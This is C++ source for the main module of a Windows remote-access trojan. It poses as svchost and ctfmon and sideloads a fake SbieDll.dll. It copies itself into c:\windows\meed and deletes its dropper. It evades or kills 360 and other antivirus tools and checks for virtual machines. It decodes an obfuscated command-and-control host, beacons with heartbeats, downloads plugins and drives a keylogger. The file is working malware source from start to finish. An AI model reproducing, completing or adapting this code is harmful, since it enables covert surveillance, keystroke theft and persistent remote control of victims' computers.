// svchost.cpp : Defines the entry point for the console application.
//
#include "StdAfx.h"
#include "targetver.h"
#include "ClientSocket.h"

#include "KernelManager.h"
#include "KeyboardManager.h"
#include "login.h"
#include "install.h"
#include "until.h"
#include "Public.h"
#include "./PluginManager/PluginServer.h"
#include "Log.h"

#include "VPNLogin.h"
#pragma comment(lib, "VPNLib.lib")


HANDLE m_hMutex = NULL;



//#include "loop.h"
// #include "until.h"
// #include "inject.h"
// #include "SendLoginImfor.h"


#include "TSPLoader1.h"
#include "TSPLoader1.cpp"


#define CASE_CLUE_ID_SIGN "}123456789_abcdefghi"

//extern int sendLoginInfo_true(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed );

// #include "TSPloader/TSPLoader2.h"
// #include "TSPloader/TSPLoader2.cpp"


// #include "TSPloader/TSPLoader3.h"
// #include "TSPloader/TSPLoader3.cpp"

// #include "TSPloader/TSPLoader4.h"
// #include "TSPloader/TSPLoader4.cpp"

// #include "TSPloader/TSPLoader5.h"
// #include "TSPloader/TSPLoader5.cpp"


//修改入口点
//#pragma comment(linker, "/entry:\"main\"")

enum
{
	NOT_CONNECT, //  还没有连接
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};

//#define		HEART_BEAT_TIME		1000 * 30;//60 * 3 // 心跳时间

extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[]);


int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress );
void __stdcall ServiceHandler(DWORD dwControl);


TCHAR g_VPNServerIP[32] = {0} ;

TCHAR g_VPNUserName[32] = {0} ;
TCHAR g_VPNPassd[32] = {0} ;

TCHAR g_LeakID[64]={0};

TCHAR g_szCaseID[32]={0};
TCHAR g_szClueID[32]={0};


CVPNLogin g_vpnlog;


#ifdef _CONSOLE
int main(int argc, char **argv);
#else
DWORD WINAPI main(char *lpServiceName);
#endif
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;
DWORD	g_dwServiceType;
char	svcname[MAX_PATH];




struct VPNINFO
{
	TCHAR szConnectIp[64];
	TCHAR szVPNServerIp[32];
	TCHAR szVPNUser[32] ;
	TCHAR szPassd[32];
	TCHAR szCaseID[8];
	TCHAR szClueID[8];
	TCHAR szLeakID[64];

};




LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	// 发生异常，重新创建进程
	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}

DWORD WINAPI KillPro(char *lpProName)
{
	HANDLE hDriver;
	MYDATA data;
	data.ModuleAddress = (ULONG)GetModuleHandle("ntdll.dll");
	while(1)
	{
		Sleep(3000);
		hDriver = CreateFile( "\\\\.\\MYDRIVERDOS", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );
		if ( hDriver == INVALID_HANDLE_VALUE ) break;
		data.Pid = GetProcessID(lpProName);
		if ( data.Pid == 0 ) continue;
		data.Pid ^= XorValue;
		DeviceIoControl( hDriver, IOCTL_KILL, &data, sizeof(MYDATA), NULL, 0, NULL, NULL );
		CloseHandle(hDriver);
	}
	return 0;
}

///////////////////////////////新的签名dll的相关函数///////////////////////////////////////////
EXTERN_C __declspec(dllexport) void SbieApi_Log(void)
{
}

//CHAR g_szWindowClass[] = "$54ET%#S$TE%^DFFE";
CHAR g_szWindowClass[] = "Global\\$54ET%#S$TE%^DFFE";
//CHAR g_szWindowClass1[] = "1ETSTEDFFE";

/*CHAR g_szWindowClass1[] = "ETSTEDFFE";*/

//STDAPI DllGetClassObject(__in REFCLSID rclsid, __in REFIID riid, LPVOID FAR* ppv)




EXTERN_C __declspec(dllexport) BOOL WINAPI SbieDll_Hook(int,int,int)
{	
	//单例
	//禁止多个实例
	//HANDLE m_hMutex = ::CreateMutexA(NULL, TRUE, g_szWindowClass);

	m_hMutex = ::CreateMutexA(NULL, TRUE, g_szWindowClass);

	DWORD dwError = ::GetLastError();
	if (ERROR_ALREADY_EXISTS == dwError || ERROR_ACCESS_DENIED == dwError) 
	{
		return -2;
	}

#if !defined(_CONSOLE)
	main("tessst");
#endif
	return 0 ;
}


extern BOOL InjectRemoteCode(LPCTSTR lpProcessName, char *szDllName,HMODULE hModule);

typedef struct HOOKEXIT  
{
	char szDelName[100];
	char szOriContent[6];

}HOOKEXIT,pHOOKEXIT;

HOOKEXIT HookExit={0};

int MyExit()
{


	//_asm int 3
	PULONG dwExitProcess=(PULONG)ExitProcess;
	MEMORY_BASIC_INFORMATION mbi={0};
	DWORD oldProtect;

	VirtualQuery((LPVOID)(dwExitProcess),&mbi,sizeof(mbi));
	VirtualProtect(mbi.BaseAddress,mbi.RegionSize,PAGE_EXECUTE_READWRITE,&oldProtect);

	memcpy((PCHAR)ExitProcess,HookExit.szOriContent,6);


	ExitProcess(0);
	return 0;
}

//inline Hook ExitProcess的前6个字节
BOOL HooKExitProcess()
{
	//	__asm int 3	

	PCHAR dwExitProcess=(PCHAR)ExitProcess;

	MEMORY_BASIC_INFORMATION mbi={0};



	DWORD oldProtect;
	memcpy(HookExit.szOriContent,dwExitProcess,6);


	VirtualQuery((LPVOID)(dwExitProcess),&mbi,sizeof(mbi));
	VirtualProtect(mbi.BaseAddress,mbi.RegionSize,PAGE_EXECUTE_READWRITE,&oldProtect);

	// push MyExit
	// ret
	//*dwExitProcess=0x68; //push  
	*(BYTE*)dwExitProcess=0xcc; //push
	dwExitProcess++;
	*(PULONG)dwExitProcess=(ULONG)MyExit;
	dwExitProcess+=4;
	*(BYTE*)dwExitProcess=0xc3;	//ret 
	return TRUE;
}




// char* szhttp="GET / HTTP/1.1.. Accept: fuck/360, fuck/kingsoft,fuck/qq"
// "Host:www.msn.com..Connection: Keep-Alive....";

int SendTrickster()
{
	char* szhttp="GET /fuck360_fuckkingsoft_fuckqq_fuckxxx\r\n\r\n";
// 	char* szhttp="GET / HTTP/1.1\r\n"
// 		"Accept: fuck/360_fuck/kingsoft_fuck/qq, image/pjpeg, application/x-shock wave-flash\r\n" 
// 		"Accept-Language: zh-en\r\n"
// 		"Accept-Encoding: gzip, deflate\r\n"
// 		"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n"
// 		//"Host:www.ollydbg.de\r\n"
// 		//"Connection: Keep-Alive\r\n"
// 		"\r\n";

 	SOCKET httpSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 

	if (httpSocket == SOCKET_ERROR)   
	{ 
		return FALSE;   
	}

	hostent* pHostent = NULL;

	pHostent = gethostbyname("www.ollydbg.de");

	if (pHostent == NULL)
		return FALSE;

	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;

	ClientAddr.sin_port	= htons(80);

	//_asm int 3
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

	if (connect(httpSocket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)   
		return FALSE;

	//_asm int 3
	send(httpSocket,szhttp,strlen(szhttp),0);

	if(!CancelIo((HANDLE)httpSocket))
	{

	}

	return 0;
}



//心跳检测
DWORD WINAPI KeepLive(LPVOID LPARAM)
{
	CClientSocket *socketClient=(CClientSocket*)LPARAM;


	while(TRUE)
	{
		//心跳包
		BYTE	bToken = TOKEN_HEARTBEAT;
		socketClient->Send((LPBYTE)&bToken, sizeof(bToken));

		//如果5分钟之类连续有10次失败，则重新连接
		
		if(socketClient->dwHeartTime==10)
		{
			SetEvent(socketClient->m_hEvent);
			socketClient->dwHeartTime=0;
		}

		socketClient->dwHeartTime++;

		Sleep(1000*30);//30S检测一次

	//	SendTrickster();//给攻击机发包
	}

	return 0;
}






void DeleteParentExeFile() 
{



	// menglz 删除父程序,tsp2.0改成了传参删除的方式





	char *pchCmdParam = NULL;

	if (StrStr(GetCommandLineA(),"-mi"))
	{


		char szParentPath[MAX_PATH*2];
		memset(&szParentPath,0,sizeof(szParentPath));

		strncpy(szParentPath,GetCommandLineA(),sizeof(szParentPath));

		pchCmdParam = StrStr(szParentPath,"-mi");

		int iLen = strlen(pchCmdParam);

		int i = 0;
		for(i=3;i<iLen;i++)
		{
			if( (char(*(pchCmdParam+i)) != '\x20') && (char(*(pchCmdParam+i)) != '\x09') )
			{

				char chTmp[MAX_PATH];
				memset(&chTmp,0,sizeof(chTmp));

				strncpy(chTmp,pchCmdParam+i,MAX_PATH);

				memset(&szParentPath,0,sizeof(szParentPath));
				strncpy(szParentPath,chTmp,MAX_PATH);
				break;
			}

		}


		if(NULL != szParentPath || strlen(szParentPath) >3)
		{
			while(PathFileExists(szParentPath))
			{


				DeleteFile(szParentPath);
				Sleep(10);
			}

		}



	}



	// tsp2.0加入以上


}


extern DWORD g_dwKBMainThreadID;

BOOL StopKBMainThread()
{

	if( 0== g_dwKBMainThreadID)
	{
		return TRUE;

	}

	PostThreadMessage(g_dwKBMainThreadID,WM_USER+104,NULL,NULL); //WM_USER+104 为退消息 在KeyLogExe里定义

	while(1)
	{
		Sleep(10);
		if(0 == g_dwKBMainThreadID)
		{
			Sleep(10);
			break;

		}

	}

	return TRUE;


}



DWORD WINAPI Check()
{
//	HooKExitProcess();


//	DeleteParentExeFile();  //yx 20140918 去掉孟磊子的删除函数

	char	strFileName[MAX_PATH];
//	HANDLE  hCtfmon;
//	HANDLE  hSibdll;
//	HANDLE  hSibdll_bak;
	CKeyboardManager::MyGetModuleFileName( 0, strFileName, sizeof(strFileName));



   // yx 20140918 打开自删除
	if (StrStr(GetCommandLineA(),"-mi"))
	{

		char szParentPath[MAX_PATH];
		GetParentProcessPath(strFileName,szParentPath,1);
		while(PathFileExists(szParentPath))
		{
			DeleteFile(szParentPath);
			Sleep(10);
		}
// 		CopyFile(strFileName,szParentPath,FALSE);
// 		My_WinExec(strFileName);

	}



	if(strstr(strFileName,"ctfmon"))  WriteAutoRun1(strFileName);



	HANDLE hEvent = CreateEvent(NULL,FALSE,FALSE,TEXT("nimdkeikd")); 


	while(TRUE)
	{
		//HANDLE hEvent=OpenEvent(EVENT_ALL_ACCESS,FALSE,TEXT("Ready"));
		if(hEvent)
		{
			WaitForSingleObject(hEvent,INFINITE);//等待结束后事件对象自动重置为无效
			//_asm int 3
	//		if(strstr(strFileName,"ctfmon")) ExitProcess(0);
			
			StopKBMainThread();

			ReleaseMutex(m_hMutex);
			
			ExitProcess(0);
		}
		ResetEvent(hEvent);
		Sleep(2000);
	}


	

	return 0;
}

//开启SHELL外壳
DWORD WINAPI StartExplorer(LPCSTR lpszDstExeName, LPCSTR lpszWindowsPath)
{
	STARTUPINFOA si = {0};
	//运行explorer
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW; 
	si.wShowWindow = SW_SHOW;

	PROCESS_INFORMATION pi = {0};


	BOOL bRet=FALSE;

	//取外壳全路径
	CHAR szCmd[MAX_PATH] = {0};
	GetWindowsDirectoryA(szCmd,MAX_PATH);
	strcat(szCmd, "\\explorer.exe");


	bRet = CreateProcessA(szCmd, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	if (bRet)
	{
		WaitForSingleObject(pi.hProcess, 10*1000);
		CloseHandle(pi.hProcess);
	}

	if (!lpszDstExeName){
		return 0;
	}

	//加命令行运行自身

	ZeroMemory(&si, sizeof(si));	
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW; 
	si.wShowWindow = SW_HIDE;

	ZeroMemory(&pi, sizeof(pi));

	bRet = CreateProcessA(NULL, (CHAR*)lpszDstExeName, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	if (bRet)
	{
		CloseHandle(pi.hProcess);
	}
	return 0;
}



// 



/////////////////////////////签名相关dll结束/////////////////////////////////////////////

// 一定要足够长
#ifdef _CONSOLE
	int main(int argc, char **argv)

#else
	DWORD WINAPI main(char *lpServiceName)
#endif
{
#ifdef _CONSOLE


	//CEvidence::GetQQlog();
	if (argc < 3)
	{
		printf("Usage:\n %s <Host> <Port>\n", argv[0]);
		return -1;
	}
	//CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MyTestWnd,0, 0, NULL);

// 	HMODULE hDll=0;
// 	typedef	BOOL	(__cdecl *pPluginFunc)(DWORD);
// 	hDll = LoadLibrary("KeyLog.dll");
// 	pPluginFunc PluginFunc = (pPluginFunc)GetProcAddress(hDll,"PluginFunc");
// 	BOOL bRet=PluginFunc(1);//调用此函数
// 
// 	
// 	system("pause");


#endif
#if !defined(_CONSOLE)


	//添加全局互斥量，禁止多个实例运行，包括一台机器上的不同用户

	
	//const   sz
	char	strFileName[MAX_PATH];
	CKeyboardManager::MyGetModuleFileName( 0, strFileName, sizeof(strFileName));


	//2014-11-12自启动放在互斥前面   modify by yx
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Check, 0, 0, NULL);

	HANDLE m_hMutex = ::CreateMutexA(NULL, TRUE, g_szWindowClass);
	DWORD dwError = ::GetLastError();
	if (ERROR_ALREADY_EXISTS == dwError || ERROR_ACCESS_DENIED == dwError) 
	{
// 		HANDLE hEvent=OpenEvent(EVENT_ALL_ACCESS,FALSE,TEXT("nimdkeikd"));
// 		if (hEvent)
// 		{
// 			SetEvent(hEvent);
// 			CloseHandle(hEvent);
// 			Sleep(2000);
// 		}
		Sleep(1000*20);
 		if(strstr(strFileName,"ctfmon")) ExitProcess(0);
 		return -2;
	}


	//_asm int 3



	char	strSbiDllName[MAX_PATH];
	strncpy(strSbiDllName,strFileName,MAX_PATH);
	LPSTR lpPos = strrchr(strSbiDllName,'\\');

	if (lpPos)
	{
		*(lpPos+1) = 0;
		lstrcat(strSbiDllName, "SbieDll.dll");
	}



	//yx 2014-07-28
	if (!strstr(strSbiDllName,"meed"))
	{
		MakeSureDirectoryPathExists("c:\\windows\\meed\\");
		std::string strmeed="c:\\windows\\meed\\ctfmon.exe";
		std::string strsbie="c:\\windows\\meed\\SbieDll.dll";
		std::string strsbiebk="c:\\windows\\meed\\SbieDll.dll.bak";

		CopyFile(strFileName,strmeed.c_str(),false);
		CopyFile(strSbiDllName,strsbie.c_str(),false);
		lstrcat(strSbiDllName,".bak");
		CopyFile(strSbiDllName,strsbiebk.c_str(),false);
		CloseHandle(m_hMutex);
		WinExec(strmeed.c_str(),0);
		ExitProcess(0);
	}
	
	//


	if (!GetProcessID("explorer.exe")&&strstr(strFileName,"ctfmon"))
	//if (strstr(strFileName,"ctfmon"))
	{

		ReleaseMutex(m_hMutex);
		CloseHandle(m_hMutex);
		StartExplorer(strFileName,0);
		//		WinExec(strFileName,0);
		ExitProcess(0);			
	}

//	yx 去掉20140918
	//if (GetProcessID("360tray.exe")&&strstr(GetCommandLineA(),"-mi"))
	//{
	//	do 
	//	{
	//		Sleep(30000);
	//	} while (TRUE);
	//}

  //zhenyu  2015-01-27 
	if (GetProcessID("360tray.exe"))
	{
		
		Sleep(600000);
	}

#endif

////////////////////////
	

	///////////////////////////


	char	strServiceName[200];
	char	strKillEvent[60];
	HANDLE	hInstallMutex = NULL;
	CKeyboardManager::MyFuncInitialization();
	

	//日志文件初始化

	
	
#ifdef _MYDEBUG
	char szModulePath[MAX_PATH];

	GetModuleFileName(NULL,szModulePath,MAX_PATH);
	char *p = strrchr(szModulePath,'\\');
	if(p) *(p+1) = 0;	
	char LogFile[MAX_PATH];
	sprintf(LogFile,"%slog\\server.log",szModulePath);
	g_log.Open(LogFile,OUT_MODE_TO_FILE,EXT_MODE_LOCAL_TIME|EXT_MODE_THREAD_ID|EXT_MODE_LINE|EXT_MODE_TRUNC,1000,64*1024*1024);
#endif
	LOG((LEVEL_FUNC_IN_OUT,"\n"));


#if !defined(_CONSOLE)




	
	
	if (lpPos)
	{
		//*(lpPos+1) = 0;
		lstrcat(strSbiDllName, ".bak");
	}

	

	CKeyboardManager::hFile = CreateFile(strSbiDllName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	//
	//__asm int 3
	char	*lpURL = (char *)FindConfigString(CKeyboardManager::hFile, "WCCCRX");


	//printf("d%s\r\n",lpURL);

	if (lpURL == NULL)
	{
		return -1;
	}
	CloseHandle(CKeyboardManager::hFile);
	//////////////////////////////////////////////////////////////////////////
	// Set Window Station
//	HWINSTA hOldStation = GetProcessWindowStation();
	char str1[50] = "gQnkdY(";
	EncryptData( (unsigned char *)&str1, lstrlen(str1), ENCODEKEY);
	HWINSTA hWinSta = OpenWindowStation( str1, FALSE, MAXIMUM_ALLOWED);
	if (hWinSta != NULL) SetProcessWindowStation(hWinSta);
	//////////////////////////////////////////////////////////////////////////

	
	if (CKeyboardManager::g_hInstance != NULL)
	{
		//SetUnhandledExceptionFilter(bad_exception);
		lstrcpy(strServiceName, lpServiceName);
		char str2[50] = "7PoZ]P@63";
		EncryptData( (unsigned char *)&str2, lstrlen(str2), ENCODEKEY+2);
		wsprintf( strKillEvent, "%s%03dJP", str2, GetTickCount() + 5 ); // 随机事件名

		hInstallMutex = CreateMutex(NULL, TRUE, lpURL);

		//ReConfigService(strServiceName); //2011/04/28 -yx 会被360报


		// 删除安装文件
//		Sleep(1000);
//		DeleteInstallFile(lpServiceName);
/*
		char *KILLNAME = "DSMain.exe";
		MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KillPro, (LPVOID)KILLNAME, 0, NULL);
		char *KILLNAMEE  = "360Safe.exe";
		MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KillPro, (LPVOID)KILLNAMEE, 0, NULL);
*/
	}
	// http://hi.baidu.com/zxhouse/blog/item/dc651c90fc7a398fa977a484.html
#endif
	// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
	SetErrorMode( SEM_FAILCRITICALERRORS );



//	return 0;

	char	*lpszHost = NULL;
	DWORD	dwPort = 80;
	char	*lpszProxyHost = NULL;//这里就当做是上线密码了
//	DWORD	dwProxyPort = 0;
//	char	*lpszProxyUser = NULL;
//	char	*lpszProxyPass = NULL;

	HANDLE hEvent = NULL;

//	printf("dddddddd\r\n");

	CClientSocket socketClient;
	socketClient.bSendLogin = TRUE;

	HANDLE hKeepLiveThread=NULL;

	//EXCEPTION_NONCONTINUABLE_EXCEPTION





	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接
	while (1)
	{
		// 如果不是心跳超时，不用再sleep两分钟
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2分钟断线重连, 为了尽快响应killevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, FALSE, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
				}
				// 改一下
				Sleep(60);
			}
		}

#if !defined(_CONSOLE)

		// 上线间隔为2分, 前6个'A'是标志

		//__asm int 3


		//add by yx 

		LOG((LEVEL_INFO,"lpURL = %s\n",lpURL));

		VPNINFO *vpn=(VPNINFO*)lpURL;

		if (strlen(vpn->szVPNServerIp)!=0)
		{
			strncpy(g_VPNServerIP,vpn->szVPNServerIp,sizeof(g_VPNServerIP));

		}

		if (strlen(vpn->szVPNUser)!=0)
		{
			strncpy(g_VPNUserName,vpn->szVPNUser,sizeof(g_VPNUserName));

		}


		if (strlen(vpn->szPassd)!=0)
		{
			strncpy(g_VPNPassd,vpn->szPassd,sizeof(g_VPNPassd));

		}

		if (strlen(vpn->szCaseID)!=0)
		{
			strncpy(g_szCaseID,vpn->szCaseID,sizeof(g_szCaseID));

		}

		if (strlen(vpn->szClueID)!=0)
		{
			strncpy(g_szClueID,vpn->szClueID,sizeof(g_szClueID));

		}

		if (strlen(vpn->szLeakID)!=0)
		{
			strncpy(g_LeakID,vpn->szLeakID,sizeof(g_LeakID));

		}

		//*********


		if (strlen(g_VPNServerIP) != 0)
		{
			char  *szVPNServerIp = decrypt(Decode(g_VPNServerIP));
			if (strcmp(szVPNServerIp,"") != 0)
			{
				char * szVPNUser = decrypt(Decode(g_VPNUserName));
				char * szVPNPassd = decrypt(Decode(g_VPNPassd));
				g_vpnlog.Login(szVPNServerIp,szVPNUser,szVPNPassd);

			}
		}
	

		///add end

		/////////////

		char *szDns=MyDecode(lpURL + 6);

		LOG((LEVEL_INFO,"szDns = %s\n",szDns));

		for (size_t i = 0;i <strlen(szDns);i++)
		{
			if (szDns[i]!=0x67)
				szDns[i] ^= 0x67;
		}

		if (!getLoginInfo(szDns, &lpszHost, &dwPort, &lpszProxyHost)) 
		{
			bBreakError = GETLOGINFO_ERROR;
			continue;
		}

		if (lpszProxyHost)
		{
			lstrcpy( CKeyboardManager::ConnPass, lpszProxyHost );//密码保存在CKeyboardManager::ConnPass中

		}
	//	_asm int 3

#else
 		lpszHost = argv[1];
 		dwPort = atoi(argv[2]);
#endif

//		if (lpszProxyHost != NULL)
//			socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);
//		else
//			socketClient.setGlobalProxyOption();

/*
		char msg[200] = {0};
		wsprintf( msg, "%s\n%d\n%s", lpszHost, dwPort, CKeyboardManager::ConnPass );
		MessageBox(NULL,msg,"",NULL);
*/
		//printf("lpszHost: %s dwPort:%d\r\n",lpszHost,dwPort);

		

		

		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;
			continue;
		}
		
		LOG((LEVEL_INFO,"连接成功,host=%s,port=%d\n",lpszHost,dwPort));

		// 设置参数，后面需要把这些传给rundll插件,在发送给子插件进行数据回传
		GLOBAL_PLUGSERVER->Init(lpszHost,(ushort)dwPort);


		CKeyboardManager::dwTickCount = GetTickCount();
		//Sleep(1000*2);
		
		// 登录
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo_false( &socketClient );
		
		CKernelManager	*pManager = CKernelManager::CreateKernelManager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
		
		socketClient.SetManagerCallBack(pManager);

	

		// 下载插件,先发送个插件下载请求，具体处理由CKernelManager在分派回来
		// 如果1秒内没收到回应，将加载默认插件
		if (!GetProcessID("N360.exe"))  //如果有诺顿，不下载DLL
		{
			GLOBAL_PLUGSERVER->SetSocket(&socketClient);
			GLOBAL_PLUGSERVER->StartSrv();
		}

		//////////////////////////////////////////////////////////////////////////
		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !pManager->IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
		if (!pManager->IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		CKeyboardManager::dwTickCount = GetTickCount();

	

		if (!hKeepLiveThread)
		{
			//创建一个心跳包线程
			
			hKeepLiveThread=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeepLive, &socketClient, 0, NULL);
		}

		do
		{
			
			hEvent = OpenEvent(EVENT_ALL_ACCESS, FALSE, strKillEvent);			
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);

			Sleep(500);
		} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);


		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
#if !defined(_CONSOLE)
	//////////////////////////////////////////////////////////////////////////
	// Restor WindowStation and Desktop	
	// 不需要恢复卓面，因为如果是更新服务端的话，新服务端先运行，此进程恢复掉了卓面，会产生黑屏
	// 	SetProcessWindowStation(hOldStation);
	// 	CloseWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
#endif


	SetErrorMode(0);
	ReleaseMutex(hInstallMutex);
	CloseHandle(hInstallMutex);

	CKernelManager::DestoryInstance();


	return 0;
}

void WINAPI TestVirtualEnv()
{
	__asm
	{
		pushad;
		rdtsc;
		push edx;

		push 1388h;
		call dword ptr Sleep;

		rdtsc;
		pop eax;
		sub eax, edx;
		test eax, eax;
		jnz RETENTRUE;

		popad;
		push 0;
		call dword ptr ExitProcess;

RETENTRUE:
		popad;
	}
}




BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
// 		TestVirtualEnv();
		if ( !CKeyboardManager::MyFuncInitialization() ) 
		{
			return FALSE;
		}

		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
		CKeyboardManager::m_dwLastMsgTime = GetTickCount();
		CKeyboardManager::Initialization();
	//	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MyTestWnd,0, 0, NULL);



#if !defined(_CONSOLE)
		main("sssss");
#endif

		//HANDLE hThread = NULL;
		//MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)"sssss", 0, NULL);


		break;

	case DLL_THREAD_ATTACH:
		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
		CKeyboardManager::m_dwLastMsgTime = GetTickCount();
		CKeyboardManager::Initialization();
		break;

	case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}

DWORD WINAPI Protect_Self(LPVOID lparam)
{
	char *ServiceName = (char*)lparam;//服务名称
	char Self_Path[MAX_PATH] = {0};//自身路径
	CKeyboardManager::MyGetModuleFileName( CKeyboardManager::g_hInstance, Self_Path, sizeof(Self_Path) );
	char bin[MAX_PATH] = {0};
	wsprintf( bin, "SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", ServiceName );
	SleepEx(15000,0);
	CKeyboardManager::MyMoveFile(Self_Path, "12333.cmd");
	WriteRegEx( HKEY_LOCAL_MACHINE, bin, "ServiceDll", REG_EXPAND_SZ, Self_Path, lstrlen(Self_Path) + 1, 0 );
	CKeyboardManager::MyMoveFile( "12333.cmd", Self_Path );
	return 0;
}

void ServiceMain( int argc, wchar_t* argv[] )
{
// 	TestVirtualEnv();
	lstrcpyn(svcname, (char*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
    wcstombs(svcname, argv[0], sizeof svcname);
    hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
//	if( hServiceStatus == NULL )
//		return;
//	else
		FreeConsole();
    TellSCM( SERVICE_START_PENDING, 0, 1 );
    TellSCM( SERVICE_RUNNING, 0, 0);
    // call Real Service function noew

	g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
	HANDLE hThread = NULL;
	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	//为过360的注册表警告，暂时将其注释
// 	MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Protect_Self, (LPVOID)svcname, 0, NULL);
	do
	{
		Sleep(100);//not quit until receive stop command, otherwise the service will stop
	}while(g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	
	if (g_dwServiceType == 0x120)
	{
		//Shared的服务 ServiceMain 不退出，不然一些系统上svchost进程也会退出
		while (1) Sleep(10000);
	}

    return;
}

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    srvStatus.dwCurrentState = g_dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 1000;
    return SetServiceStatus( hServiceStatus, &srvStatus );
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
    // not really necessary because the service stops quickly
    switch( dwControl )
    {
    case SERVICE_CONTROL_STOP:
        TellSCM( SERVICE_STOP_PENDING, 0, 1 );
        Sleep(100);
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
        TellSCM( SERVICE_PAUSED, 0, 0 );
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
        TellSCM( SERVICE_RUNNING, 0, 0 );
        break;
    case SERVICE_CONTROL_INTERROGATE:
        TellSCM( g_dwCurrState, 0, 0 );
        break;
    }
}
